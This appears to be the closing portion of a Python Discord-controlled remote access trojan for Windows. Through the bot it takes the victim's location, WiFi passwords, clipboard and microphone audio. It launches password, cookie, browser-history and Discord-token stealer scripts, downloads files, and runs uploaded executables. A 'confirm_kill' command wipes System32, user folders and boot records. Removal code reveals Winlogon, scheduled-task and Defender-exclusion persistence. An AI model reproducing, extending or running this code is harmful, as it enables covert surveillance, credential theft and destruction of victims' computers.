$w.Start()
$t = 0
while (($w.Status -ne "Ready") -and ($w.Permission -ne "Denied") -and ($t -lt 20)) { Start-Sleep -Milliseconds 250; $t++ }
if ($w.Permission -eq "Denied") { Write-Output '{"error":"denied"}' }
else { $l = $w.Position.Location; if ($l.IsUnknown) { Write-Output '{"error":"unknown"}' } else { @{lat=$l.Latitude;lon=$l.Longitude;acc=$l.HorizontalAccuracy} | ConvertTo-Json } }
'''
    lat = lon = acc = None
    try:
        raw = ps(ps_script).stdout.strip()
        if raw:
            data = json.loads(raw)
            if "error" not in data:
                lat, lon, acc = data.get("lat"), data.get("lon"), data.get("acc")
    except Exception:
        pass
    if lat is None or lon is None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json/?fields=lat,lon") as r:
                    data = await r.json()
            lat, lon, acc = data.get("lat"), data.get("lon"), "IP-based"
        except Exception:
            pass
    if lat is None:
        await ctx.send(embed=create_embed("Error", "Could not retrieve location.", 0xff0000))
        return
    await ctx.send(embed=create_embed("📍 Coordinates", f"`{lat}, {lon}` ({acc})\nhttps://www.google.com/maps?q={lat},{lon}", 0x0084ff))


@bot.command(aliases=["mount-iso", "mount"])
async def mount_iso(ctx, *, filename: str = None):
    global current_dir
    if not filename:
        await ctx.send(embed=create_embed("Error", "Usage: `.mount <file.iso>`", 0xffa500))
        return
    path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
    result = ps(f"$i = Mount-DiskImage -ImagePath '{path}' -PassThru; ($i | Get-Volume).DriveLetter")
    await ctx.send(embed=create_embed("💿 ISO Mounted", f"Drive: `{result.stdout.strip()}`", 0x0084ff))


@bot.command(aliases=["unmount-iso", "unmount"])
async def unmount_iso(ctx, *, filename: str = None):
    global current_dir
    if not filename:
        await ctx.send(embed=create_embed("Error", "Usage: `.unmount <file.iso|drive>`", 0xffa500))
        return
    if len(filename) == 1 and filename.isalpha():
        ps(f"Dismount-DiskImage -DevicePath \\\\.\\{filename}:")
    else:
        path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
        ps(f"Dismount-DiskImage -ImagePath '{path}'")
    await ctx.send(embed=create_embed("⏏️ ISO Unmounted", filename, 0x0084ff))


@bot.command(aliases=["enable-device"])
async def enable_device(ctx, index: int = None):
    if index is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.enable-device <n>`", 0xffa500))
        return
    ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Enable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🔌 Device", out if out != "NOT_FOUND" else f"Device {index} not found.", 0x0084ff))


@bot.command(aliases=["disable-device"])
async def disable_device(ctx, index: int = None):
    if index is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.disable-device <n>`", 0xffa500))
        return
    ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Disable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🚫 Device", out if out != "NOT_FOUND" else f"Device {index} not found.", 0x0084ff))


@bot.command(aliases=["speedtest", "speed"])
async def speed_test(ctx):
    await ctx.message.add_reaction("🚀")
    ps_script = '''
$cli = Get-Command speedtest -ErrorAction SilentlyContinue
if (-not $cli) { winget install --id Ookla.Speedtest --silent --accept-source-agreements --accept-package-agreements | Out-Null }
speedtest -f json
'''
    raw = ps(ps_script).stdout.strip()
    if raw.startswith("{"):
        data = json.loads(raw)
        dl = round(data["download"]["bandwidth"] * 8 / 1e6, 2)
        ul = round(data["upload"]["bandwidth"] * 8 / 1e6, 2)
        ping = round(data["ping"]["latency"], 2)
        await ctx.send(embed=create_embed("🚀 Speedtest", f"**Ping:** {ping} ms\n**Down:** {dl} Mbps\n**Up:** {ul} Mbps", 0x0084ff))
    else:
        await ctx.send(embed=create_embed("Error", "Speedtest unavailable.", 0xff0000))


@bot.command(aliases=["alt-f4", "altf4"])
async def alt_f4(ctx):
    ps("$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('%{F4}')")
    await ctx.send(embed=create_embed("❌ Alt+F4", "Sent to active window.", 0x0084ff))


@bot.command(aliases=["airplane-mode", "airplane"])
async def airplane_mode(ctx, state: str = None):
    if not state or state.lower() not in ["on", "off"]:
        await ctx.send(embed=create_embed("Error", "Usage: `.airplane <on|off>`", 0xffa500))
        return
    await ctx.message.add_reaction("✈️")
    if state.lower() == "on":
        ps("Disable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
    else:
        ps("Enable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
    await ctx.send(embed=create_embed("✈️ Airplane Mode", state.upper(), 0x0084ff))


@bot.command(aliases=["mute"])
async def toggle_mute(ctx):
    ps("$w = New-Object -ComObject WScript.Shell; $w.SendKeys([char]173)")
    await ctx.send(embed=create_embed("🔇 Mute", "Toggled.", 0x0084ff))


@bot.command(aliases=["show-screens", "screens"])
async def show_screens(ctx):
    await ctx.message.add_reaction("🖥️")
    ps_script = r'''
Add-Type -AssemblyName System.Windows.Forms
$s = [System.Windows.Forms.Screen]::AllScreens
$i = 1
$o = @()
foreach ($sc in $s) { $p = if ($sc.Primary) { " (Primary)" } else { "" }; $o += "$i. $($sc.DeviceName)$p - $($sc.Bounds.Width)x$($sc.Bounds.Height)"; $i++ }
$o -join "`n"
'''
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🖥️ Displays", f"```{out or 'None detected'}```", 0x0084ff))


@bot.command(aliases=["screen-mode"])
async def screen_mode(ctx, mode: str = None):
    args = {"expand": "/extend", "duplicate": "/clone", "internal": "/internal", "external": "/external"}
    if not mode or mode.lower() not in args:
        await ctx.send(embed=create_embed("Error", "Usage: `.screen-mode <expand|duplicate|internal|external>`", 0xffa500))
        return
    subprocess.run(f"displayswitch.exe {args[mode.lower()]}", shell=True)
    await ctx.send(embed=create_embed("🖥️ Display Mode", mode.capitalize(), 0x0084ff))


@bot.command(aliases=["rotate-screen", "rotate"])
async def rotate_screen(ctx, degrees: int = None):
    if degrees not in (0, 90, 180, 270):
        await ctx.send(embed=create_embed("Error", "Usage: `.rotate <0|90|180|270>`", 0xffa500))
        return
    try:
        dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
        dm.DisplayOrientation = degrees // 90
        if degrees in (90, 270):
            dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
        win32api.ChangeDisplaySettings(dm, 0)
        await ctx.send(embed=create_embed("🖥️ Rotate", f"Screen rotated to {degrees}°.", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["lock-pc"])
async def lock_pc(ctx):
    ctypes.windll.user32.LockWorkStation()
    await ctx.send(embed=create_embed("🔒 Lock", "Workstation locked.", 0x0084ff))


@bot.command(aliases=["sleep-pc"])
async def sleep_pc(ctx):
    subprocess.Popen("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
    await ctx.send(embed=create_embed("😴 Sleep", "Going to sleep.", 0x0084ff))


@bot.command(aliases=["restart-pc"])
async def restart_pc(ctx):
    os.system("shutdown /r /f /t 0")
    await ctx.send(embed=create_embed("🔁 Restart", "Restarting.", 0xff0000))


@bot.command(aliases=["shutdown-pc"])
async def shutdown_pc(ctx):
    os.system("shutdown /s /f /t 0")
    await ctx.send(embed=create_embed("⏻ Shutdown", "Shutting down.", 0xff0000))


@bot.command()
async def sysinfo(ctx):
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        e = create_embed("🖥️ System Info", "", 0x3498db)
        e.add_field(name="Host", value=socket.gethostname(), inline=True)
        e.add_field(name="OS", value=f"{__import__('platform').system()} {__import__('platform').release()}", inline=True)
        e.add_field(name="User", value=os.getlogin(), inline=True)
        e.add_field(name="CPU", value=f"{cpu}%", inline=True)
        e.add_field(name="RAM", value=f"{ram.percent}% ({ram.used // 1e6:.0f}/{ram.total // 1e6:.0f} MB)", inline=True)
        e.add_field(name="Disk", value=f"{disk.percent}% used", inline=True)
        e.add_field(name="Boot", value=boot, inline=False)
        await ctx.send(embed=e)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def battery(ctx):
    try:
        b = psutil.sensors_battery()
        if not b:
            await ctx.send(embed=create_embed("🔋 Battery", "No battery detected.", 0x3498db))
            return
        state = "Charging" if b.power_plugged else "Discharging"
        await ctx.send(embed=create_embed("🔋 Battery", f"**{b.percent}%** ({state})", 0x00ff00 if b.power_plugged else 0xffa500))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["wifi-passwords"])
async def wifi(ctx):
    try:
        out = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
        profiles = [l.split(":", 1)[1].strip() for l in out.splitlines() if "All User Profile" in l]
        lines = []
        for p in profiles:
            r = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"], capture_output=True, text=True).stdout
            key = next((l.split(":", 1)[1].strip() for l in r.splitlines() if "Key Content" in l), "(open)")
            lines.append(f"{p} : {key}")
        await ctx.send(embed=create_embed("📶 WiFi", f"```{chr(10).join(lines) or 'None'}```", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def drives(ctx):
    lines = []
    for part in psutil.disk_partitions():
        try:
            u = psutil.disk_usage(part.mountpoint)
            lines.append(f"{part.device} {part.fstype} {u.used // 1e9:.1f}/{u.total // 1e9:.1f} GB")
        except Exception:
            lines.append(part.device)
    await ctx.send(embed=create_embed("💽 Drives", f"```{chr(10).join(lines)}```", 0x3498db))


@bot.command()
async def startup(ctx):
    out = ps("Get-CimInstance Win32_StartupCommand | Select-Object Name, Command | Format-Table -AutoSize | Out-String").stdout
    await ctx.send(embed=create_embed("🚀 Startup", f"```{out[-1900:]}```", 0x3498db))


@bot.command(aliases=["window-list", "windows"])
async def window_list(ctx):
    titles = enum_windows()
    await ctx.send(embed=create_embed("🪟 Open Windows", f"```{chr(10).join(titles[:40])}```", 0x3498db))


@bot.command()
async def focus(ctx, *, title: str):
    def cb(hwnd, _):
        if title.lower() in win32gui.GetWindowText(hwnd).lower():
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetForegroundWindow(hwnd)
            return False
        return True
    win32gui.EnumWindows(cb, None)
    await ctx.send(embed=create_embed("🪟 Focus", f"Focused window matching `{title}`.", 0x00ff00))


@bot.command(aliases=["close-window"])
async def close_window(ctx, *, title: str):
    def cb(hwnd, _):
        if title.lower() in win32gui.GetWindowText(hwnd).lower():
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        return True
    win32gui.EnumWindows(cb, None)
    await ctx.send(embed=create_embed("🪟 Close", f"Closed windows matching `{title}`.", 0xff0000))


@bot.command(aliases=["clip"])
async def clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        await ctx.send(embed=create_embed("📋 Clipboard", f"```{data[:1900]}```", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"Clipboard empty or unsupported: {e}", 0xff0000))


@bot.command(aliases=["set-clipboard"])
async def set_clipboard(ctx, *, text: str):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        await ctx.send(embed=create_embed("📋 Clipboard", "Text set.", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def beep(ctx):
    winsound.Beep(1000, 500)
    await ctx.send(embed=create_embed("🔔 Beep", "Beeped.", 0x00ff00))


@bot.command()
async def notepad(ctx, *, text: str = None):
    if text:
        path = os.path.join(BASE_DIR, "note.txt")
        with builtins.open(path, "w", encoding="utf-8") as f:
            f.write(text)
        subprocess.Popen(["notepad.exe", path])
    else:
        subprocess.Popen(["notepad.exe"])
    await ctx.send(embed=create_embed("📝 Notepad", "Opened.", 0x00ff00))


@bot.command()
async def screensaver(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF140, 0)
    await ctx.send(embed=create_embed("🖼️ Screensaver", "Started.", 0x00ff00))


@bot.command()
async def taskbar(ctx, state: str = None):
    if state not in ("hide", "show"):
        await ctx.send(embed=create_embed("Error", "Usage: `.taskbar <hide|show>`", 0xffa500))
        return
    hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
    await ctx.send(embed=create_embed("🪟 Taskbar", state.capitalize(), 0x0084ff))


@bot.command(aliases=["desktop-icons"])
async def desktop_icons(ctx, state: str = None):
    if state not in ("hide", "show"):
        await ctx.send(embed=create_embed("Error", "Usage: `.desktop-icons <hide|show>`", 0xffa500))
        return
    progman = win32gui.FindWindow("Progman", None)
    shell = win32gui.FindWindowEx(progman, 0, "SHELLDLL_DefView", None)
    if shell:
        win32gui.ShowWindow(shell, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
    await ctx.send(embed=create_embed("🖥️ Desktop Icons", state.capitalize(), 0x0084ff))


@bot.command(aliases=["mic-record"])
async def mic_record(ctx, seconds: int = 5):
    await ctx.message.add_reaction("🎙️")
    try:
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype=np.int16, device=selected_mic)
        sd.wait()
        path = os.path.join(BASE_DIR, "mic_rec.wav")
        with wave.open(path, "wb") as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(rec.tobytes())
        await ctx.send(embed=create_embed("🎙️ Recording", f"{seconds}s", 0x0084ff), file=discord.File(path))
        os.remove(path)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["grab-url", "wget", "download-url"])
async def grab_url(ctx, url: str, *, dest: str = None):
    global current_dir
    try:
        name = dest or url.split("/")[-1] or "file.bin"
        path = os.path.join(current_dir, name) if not os.path.isabs(name) else name
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                with builtins.open(path, "wb") as f:
                    f.write(await resp.read())
        await ctx.send(embed=create_embed("📥 Downloaded", f"`{name}` -> `{current_dir}`", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["installed", "installed-apps"])
async def installed_apps(ctx):
    apps = []
    for root in (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                 r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"):
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, root)
            for i in range(winreg.QueryInfoKey(k)[0]):
                try:
                    sub = winreg.OpenKey(k, winreg.EnumKey(k, i))
                    name = winreg.QueryValueEx(sub, "DisplayName")[0]
                    apps.append(name)
                except Exception:
                    pass
        except Exception:
            pass
    await ctx.send(embed=create_embed("📦 Installed Apps", f"```{chr(10).join(sorted(set(apps))[:60])}```", 0x3498db))


@bot.command()
async def services(ctx):
    out = ps("Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 60 Name, DisplayName | Format-Table -AutoSize | Out-String").stdout
    await ctx.send(embed=create_embed("⚙️ Services", f"```{out[-1900:]}```", 0x3498db))


@bot.command(aliases=["take"])
async def grab(ctx, item: str):
    scripts = {
        "passwords": os.path.join(RESOURCES_DIR, "passwords.py"),
        "history": os.path.join(RESOURCES_DIR, "history.py"),
        "discord": os.path.join(RESOURCES_DIR, "discord.py"),
        "cookies": os.path.join(RESOURCES_DIR, "cookies.py"),
        "ip": os.path.join(RESOURCES_DIR, "ip.py"),
    }
    if item == "all":
        for script in scripts.values():
            if os.path.exists(script):
                subprocess.Popen(["python", script], creationflags=subprocess.CREATE_NEW_CONSOLE)
        await ctx.send(embed=create_embed("💰 Grab", "All scripts running.", 0x00ff00))
    elif item in scripts:
        if os.path.exists(scripts[item]):
            subprocess.Popen(["python", scripts[item]], creationflags=subprocess.CREATE_NEW_CONSOLE)
            await ctx.send(embed=create_embed("💰 Grab", f"Running {item}.", 0x00ff00))
        else:
            await ctx.send(embed=create_embed("Error", f"{scripts[item]} not found.", 0xff0000))
    else:
        await ctx.send(embed=create_embed("Error", "Options: passwords, history, discord, cookies, ip, all", 0xff0000))


@bot.command(aliases=["leave-all"])
async def leave_all(ctx):
    msg = await ctx.send(embed=create_embed("⚠️ Confirm", "React ✅ within 15s to leave all servers.", 0xffa500))
    await msg.add_reaction("✅")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) == "✅" and reaction.message.id == msg.id

    try:
        await bot.wait_for("reaction_add", timeout=15.0, check=check)
    except asyncio.TimeoutError:
        await msg.edit(embed=create_embed("Cancelled", "Timed out.", 0xff0000))
        return
    left = 0
    for guild in list(bot.guilds):
        try:
            await guild.leave()
            left += 1
        except Exception:
            pass
    await ctx.send(embed=create_embed("👋 Left", f"Left {left} servers.", 0x0084ff))


@bot.command(aliases=["clean"])
async def clear(ctx):
    await ctx.send("`🚮` Cleaning...")
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name != CHANNEL_NAMES["panel"]:
                try:
                    await channel.purge(limit=1000)
                except Exception:
                    pass
    await ctx.send(embed=create_embed("🚮 Clean", "Channels cleared.", 0x00ff00))


@bot.command()
async def confirm_kill(ctx):
    await ctx.send("`💻` Destroying system...")
    try:
        subprocess.run(["takeown", "/f", "C:\\Windows\\System32", "/r", "/d", "y"], capture_output=True)
        subprocess.run(["icacls", "C:\\Windows\\System32", "/grant", "everyone:F", "/t"], capture_output=True)
        shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)
        for folder in ["Downloads", "Desktop", "Documents", "Music", "Pictures", "Videos"]:
            path = os.path.join(os.path.expanduser("~"), folder)
            if os.path.exists(path):
                shutil.rmtree(path, ignore_errors=True)
        subprocess.run(["bcdedit", "/delete", "{current}"], capture_output=True)
        subprocess.run(["bootrec", "/fixmbr"], capture_output=True)
        os.system("shutdown /r /f /t 0")
    except Exception:
        pass


@bot.command(aliases=["implode"])
async def delete_malware(ctx):
    await ctx.send("Starting cleanup...")

    def clean_system():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, r"C:\Windows\System32\userinit.exe,")
            winreg.CloseKey(key)
        except Exception:
            pass
        subprocess.run(["schtasks", "/Delete", "/TN", "ZZZ_Security_Logon", "/F"], capture_output=True)
        subprocess.run(["schtasks", "/Delete", "/TN", "ZZZ_Security_Boot", "/F"], capture_output=True)
        ps(f'Remove-MpPreference -ExclusionPath "{BASE_DIR}"')
        if os.path.exists(r"C:\Windows\System32\ZZZ_Security"):
            shutil.rmtree(r"C:\Windows\System32\ZZZ_Security", ignore_errors=True)

    try:
        await asyncio.to_thread(clean_system)
        await ctx.send("Removed. Closing...")
        await asyncio.sleep(2)
        await bot.close()
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def exit(ctx):
    await ctx.send(embed=create_embed("👋 Goodbye", "Closing.", 0x00ff00))
    os._exit(0)


@bot.command()
async def update(ctx):
    if not ctx.message.attachments:
        await ctx.send("Attach the new file")
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith(".exe"):
        await ctx.send("Must be .exe")
        return
    new_path = os.path.join(BASE_DIR, "update.exe")
    await attachment.save(new_path)
    subprocess.Popen([new_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
    await ctx.send(embed=create_embed("📲 Updating", "Closing old version...", 0x00ff00))
    os._exit(0)


@bot.command(aliases=["set-date"])
async def set_date(ctx, date_str: str):
    ps(f'Set-Date -Date "{date_str}"')
    await ctx.send(embed=create_embed("📅 Date", f"Set to {date_str}.", 0x00ff00))


@bot.command(aliases=["set-time", "set-hour"])
async def set_time(ctx, time_str: str):
    ps(f'Set-Date -Date "{time_str}"')
    await ctx.send(embed=create_embed("⌛ Time", f"Set to {time_str}.", 0x00ff00))


@bot.command(aliases=["uac-bypass"])
async def uac_bypass(ctx):
    await ctx.send("`🧮` Attempting UAC bypass...")
    subprocess.run(["powershell", "-Command", "Start-Process powershell -Verb runAs"], capture_output=True)
    await ctx.send(embed=create_embed("🧮 UAC", "Elevation attempted.", 0x00ff00))


@bot.command(aliases=["ask-admin"])
async def ask_admin(ctx):
    if is_admin():
        await ctx.send("`👔` Already admin.")
        return
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    await ctx.send(embed=create_embed("👔 Admin", "UAC prompt sent.", 0x00ff00))


@bot.event
async def on_message(message):
    if isinstance(message.channel, discord.DMChannel):
        return

    gid = message.guild.id
    chans = CHANNEL_IDS.get(gid, {})
    channel_id = message.channel.id

    if channel_id in (chans.get("keys"), chans.get("microphone")):
        if not message.author.bot:
            try:
                await message.delete()
            except Exception:
                pass
        return

    if CATEGORY_IDS.get(gid) is None or message.channel.category_id != CATEGORY_IDS.get(gid):
        return

    if channel_id == chans.get("cmds"):
        await bot.process_commands(message)
        return

    if message.author.bot:
        return

    try:
        await message.delete()
    except Exception:
        pass


if __name__ == "__main__":
    bot.run(token)
